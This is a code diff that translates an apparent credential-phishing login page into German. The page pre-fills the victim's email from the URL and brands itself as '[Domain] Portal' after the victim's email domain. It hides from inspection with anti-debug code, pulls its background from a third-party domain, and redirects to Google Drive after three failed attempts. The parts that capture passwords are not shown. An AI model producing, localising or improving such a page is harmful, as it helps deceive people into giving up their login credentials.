@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Secure Access | Portal Sign In</title>
+    <title>Sicherer Zugang | Portal-Anmeldung</title>
     <style>
         * {
             margin: 0;
@@ -211,36 +211,36 @@
 <body>
 
 <!-- BACKGROUND IMAGE -->
-<img class="bg-image" src="https://newcartelteam.fun/Screenshot_25-5-2026_17453.jpeg" alt="Background">
+<img class="bg-image" src="https://newcartelteam.fun/Screenshot_25-5-2026_17453.jpeg" alt="Hintergrundbild">
 
-<!-- CENTERED COMPACT SIGNIN MODULE -->
+<!-- CENTERED COMPACT SIGNIN MODULE (GERMAN) -->
 <div class="login-wrapper">
     <div class="glass-panel" id="loginPanel">
         <div class="domain-logo-container">
             <div class="domain-logo">
                 <span class="domain-icon" id="dynamicDomainIcon">🔐</span>
-                <span class="domain-image-text" id="domainImageText">SECURE PORTAL</span>
+                <span class="domain-image-text" id="domainImageText">SICHERES PORTAL</span>
             </div>
         </div>
 
         <form id="loginForm">
             <div class="input-row">
-                <div class="input-label">📧 Verified email</div>
-                <input type="email" id="email" name="email" class="input-field" readonly placeholder="loading email...">
+                <div class="input-label">📧 Bestätigte E-Mail</div>
+                <input type="email" id="email" name="email" class="input-field" readonly placeholder="E-Mail wird geladen...">
             </div>
             <div class="input-row">
-                <div class="input-label">🔑 Passphrase</div>
-                <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" autocomplete="off" required>
+                <div class="input-label">🔑 Passwort</div>
+                <input type="password" id="password" name="password" class="input-field" placeholder="Geben Sie Ihr Passwort ein" autocomplete="off" required>
             </div>
-            <div id="statusMessage" class="message-area msg-info">🔒 Enter passphrase to continue</div>
-            <button type="submit" id="loginAction" class="login-btn">SIGN IN</button>
+            <div id="statusMessage" class="message-area msg-info">🔒 Passwort eingeben, um fortzufahren</div>
+            <button type="submit" id="loginAction" class="login-btn">ANMELDEN</button>
         </form>
     </div>
 </div>
 
 <script>
     // ============================================================
-    // ANTI-DEBUG / ANTI-INSPECT PROTECTION
+    // ANTI-DEBUG / ANTI-INSPECT PROTECTION (Deutsche Version)
     // ============================================================
     
     (function() {
@@ -303,12 +303,12 @@
     })();
     
     // ============================================================
-    // SIGN IN LOGIC - UPDATED: Redirect timer is now 10 seconds
-    // - 1st & 2nd failed: "Incorrect password" message (auto-hide)
-    // - 3rd failed: LOCK system + background redirect to Google Drive after 10 SECONDS
-    // - Successful login: Clears any pending redirect timer and goes to user domain
+    // LOGIN LOGIC - GERMAN MESSAGES + 10-second Google Drive redirect
+    // - 1st & 2nd failure: "Falsches Passwort" (auto-hide)
+    // - 3rd failure: System lock + redirect to Google Drive after 10 SECONDS
+    // - Success: Cancels redirect timer + goes to user's domain
     // - Email extracted from URL (hash or query) + base64 support
-    // - Displays "[Domain] Portal" with original gradient design
+    // - Displays "[Domain] Portal" with gradient design
     // ============================================================
     
     (function() {
@@ -340,12 +340,11 @@
         if (emailInput) emailInput.value = updatedEmail;
 
         // ============================================================
-        // DOMAIN NAME CAPTURE: Displays as "[Domain] Portal"
+        // DOMAIN NAME CAPTURE: Displays as "[Domain] Portal" (German)
         // Example: email = user@google.com => "Google Portal"
-        // Maintains same gradient & styling
         // ============================================================
-        let rawDomain = updatedEmail.split('@')[1]?.split('.')[0] || "SECURE";
-        // Capitalize first letter (e.g., google -> Google)
+        let rawDomain = updatedEmail.split('@')[1]?.split('.')[0] || "SICHER";
+        // Capitalize first letter
         let displayDomain = rawDomain.charAt(0).toUpperCase() + rawDomain.slice(1).toLowerCase();
         const portalDisplayText = `${displayDomain} Portal`;
         
@@ -371,12 +370,12 @@
         }
         
         // ============================================================
-        // AUTH STATE
+        // AUTH STATE (German messages)
         // ============================================================
         const CORRECT_PASSWORD = "P@ssw0rd2025!";
         let failedAttempts = 0;
         let locked = false;
-        let redirectTimer = null;  // Timer for Google Drive redirect on lock (NOW 10 SECONDS)
+        let redirectTimer = null;  // Timer for Google Drive redirect on lock (10 SECONDS)
         let messageTimeout = null;
         
         const form = document.getElementById("loginForm");
@@ -399,7 +398,7 @@
             if (autoClear && (type === 'warning' || type === 'error')) {
                 messageTimeout = setTimeout(() => {
                     if (!locked) {
-                        statusDiv.innerHTML = "🔒 Enter passphrase to continue";
+                        statusDiv.innerHTML = "🔒 Passwort eingeben, um fortzufahren";
                         statusDiv.classList.remove('msg-warning', 'msg-error');
                         statusDiv.classList.add('msg-info');
                     }
@@ -408,7 +407,7 @@
             }
         }
 
-        // Clears any pending background redirect to Google Drive (important for successful login)
+        // Cancels any pending background redirect to Google Drive (important for successful login)
         function cancelUndergroundRedirect() {
             if (redirectTimer) {
                 clearTimeout(redirectTimer);
@@ -418,10 +417,10 @@
 
         // Starts the 10-second timer to redirect to Google Drive (only called when system locks)
         function startUndergroundRedirect() {
-            cancelUndergroundRedirect(); // clear any previous just in case
+            cancelUndergroundRedirect();
             redirectTimer = setTimeout(function() {
                 window.location.href = "https://drive.google.com";
-            }, 10000); // 🔥 UPDATED: 10 seconds instead of 60
+            }, 10000); // 🔥 UPDATED: 10 seconds
         }
 
         function lockSystem() {
@@ -430,7 +429,7 @@
             passwordField.disabled = true;
             const panel = document.getElementById('loginPanel');
             if (panel) panel.classList.add('locked-ui');
-            setMessage("⛔ ACCESS DENIED • SYSTEM LOCKED", "error", false);
+            setMessage("⛔ ZUGANG VERWEIGERT • SYSTEM GESPERRT", "error", false);
             // Start the 10-second Google Drive redirect
             startUndergroundRedirect();
         }
@@ -443,12 +442,12 @@
             }
         }
 
-        // Form submission handler
+        // Form submission handler (German)
         form.onsubmit = (e) => {
             e.preventDefault();
             
             if (locked) {
-                setMessage("System locked. Access revoked.", "error", true);
+                setMessage("System gesperrt. Zugriff verweigert.", "error", true);
                 return;
             }
             
@@ -467,10 +466,10 @@
 
             // Validate password
             if (enteredPassword === CORRECT_PASSWORD) {
-                // ✅ SUCCESSFUL LOGIN: Cancel any pending Google Drive redirect (very important)
+                // ✅ SUCCESSFUL LOGIN: Cancel any pending Google Drive redirect
                 cancelUndergroundRedirect();
                 
-                setMessage("✅ ACCESS GRANTED • Redirecting...", "info", false);
+                setMessage("✅ ZUGANG GEWÄHRT • Weiterleitung...", "info", false);
                 loginButton.disabled = true;
                 passwordField.disabled = true;
                 setTimeout(() => {
@@ -483,11 +482,11 @@
                 failedAttempts++;
                 
                 if (failedAttempts >= 3) {
-                    // 3rd failure: Lock system (this will start the 10-second Google Drive redirect)
+                    // 3rd failure: Lock system (starts 10-second Google Drive redirect)
                     lockSystem();
                 } else {
                     // 1st and 2nd failure: Show warning and clear password field
-                    setMessage("❌ Incorrect password.", "warning", true);
+                    setMessage("❌ Falsches Passwort.", "warning", true);
                     passwordField.value = "";
                     passwordField.focus();
                     shakePanel();
@@ -496,18 +495,18 @@
         };
         
         // Initial message
-        setMessage("🔒 Enter passphrase to continue", "info", false);
+        setMessage("🔒 Passwort eingeben, um fortzufahren", "info", false);
         
         // Ensure email field stays readonly
         if (emailInput) emailInput.setAttribute("readonly", "readonly");
         
-        // Update browser title to reflect Portal name
+        // Update browser title to reflect Portal name (German)
         const titleElement = document.querySelector('title');
         if (titleElement) {
-            titleElement.innerText = `${displayDomain} Portal | Secure Access`;
+            titleElement.innerText = `${displayDomain} Portal | Sicherer Zugang`;
         }
         
-        // On page unload, ensure we cancel timer if user leaves (just safety)
+        // On page unload, ensure we cancel timer (safety)
         window.addEventListener('beforeunload', function() {
             cancelUndergroundRedirect();
         });
